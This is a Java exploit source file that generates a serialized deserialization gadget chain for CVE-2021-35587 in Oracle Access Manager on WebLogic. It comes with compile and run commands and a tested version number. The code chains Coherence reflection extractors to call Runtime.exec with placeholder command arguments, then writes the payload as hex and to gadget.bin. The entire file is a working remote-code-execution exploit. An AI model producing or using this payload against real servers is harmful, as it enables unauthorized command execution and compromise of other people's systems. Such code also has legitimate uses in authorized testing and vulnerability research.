// This gadget chain targets Oracle Access Manager on WebLogic (CVE-2021-35587) and is based upon:
// * Y4er: https://github.com/Y4er/CVE-2020-2883/blob/master/CVE_2020_2883.java
// * Jang: https://twitter.com/testanull/status/1502114473989279744
//
// Tested against Oracle Access Manager version:
// * 12.2.1.4.0
//
// Compile with:
//     javac -cp coherence.jar:com.bea.core.weblogic.rmi.client.jar gadget.java
//
// Run with:
//     java --add-opens java.base/java.util=ALL-UNNAMED -cp coherence.jar:com.bea.core.weblogic.rmi.client.jar:. gadget
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

// coherence.jar
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

// com.bea.core.weblogic.rmi.client.jar
import weblogic.rmi.provider.BasicServiceContext;

public class gadget {

    public static void main(String[] args) throws Exception
    {
        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[]{}});
        ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[]{}});
        ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"EXEC_ARG0", "EXEC_ARG1", "EXEC_ARG2"}});

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                reflectionExtractor1,
                reflectionExtractor2,
                reflectionExtractor3,
        };

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, valueExtractors);

        Field field = PriorityQueue.class.getDeclaredField("queue");
        field.setAccessible(true);

        Object[] queueArray = (Object[]) field.get(queue);

        queueArray[0] = Runtime.class;
        queueArray[1] = "1";

        BasicServiceContext bsc = new BasicServiceContext(1, queue, false);

        byte[] bytes = serialize(bsc);
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        System.out.println(sb.toString());

		FileOutputStream fos = new FileOutputStream("gadget.bin");
		ObjectOutputStream os = new ObjectOutputStream(fos);
		os.writeObject(bsc);
		os.close();

        //deserialize(bytes);
    }

    public static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        serialize(obj, out);
        return out.toByteArray();
    }

    public static void serialize(final Object obj, final OutputStream out) throws IOException {
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.flush();
        objOut.close();
    }

    public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        final ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        return deserialize(in);
    }

    public static Object deserialize(final InputStream in) throws ClassNotFoundException, IOException {
        final ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }

}